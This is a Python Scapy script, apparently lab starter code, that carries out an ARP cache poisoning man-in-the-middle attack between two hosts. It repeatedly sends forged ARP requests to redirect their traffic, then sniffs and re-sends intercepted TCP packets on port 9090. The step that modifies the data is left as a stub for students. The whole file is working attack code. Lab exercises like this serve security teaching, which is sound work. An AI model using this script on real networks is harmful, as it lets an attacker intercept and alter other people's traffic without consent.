#!/usr/bin/env python3
from scapy.all import *
import threading

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

MAC_ATTACKER = "02:42:0a:09:00:69"

def fake_arp_request(victim_ip, target_ip):
    E = Ether()
    E.src = MAC_ATTACKER

    A = ARP()
    A.psrc = target_ip
    A.pdst = victim_ip
    A.hwsrc = MAC_ATTACKER
    A.op = 1
    pkt = E/A
    sendp(pkt)

def send_packet():
    while True:
        print("Sending fake ARP requests")
        fake_arp_request(IP_A, IP_B)
        fake_arp_request(IP_B, IP_A)
        time.sleep(5)

send_thread = threading.Thread(target=send_packet)

# Start the sending thread
send_thread.daemon = True  # This makes the thread exit when the main program exits
send_thread.start()


def spoof_pkt(pkt):
    # print("Packet received ...........")
    # pkt.show()
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data

            newdata = data # No change is made in this sample code
            p = newpkt/newdata
            print("Packet sent A->B new ...........")
            p.show()
            send(p)
        else:
            print("Packet sent A->B...........")
            newpkt.show()
            send(newpkt)
    ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        print("Packet sent B->A ...........")
        newpkt.show()
        send(newpkt)

sniff(iface="eth0", filter = "tcp port 9090", prn=spoof_pkt) # we assume that the port number is 9090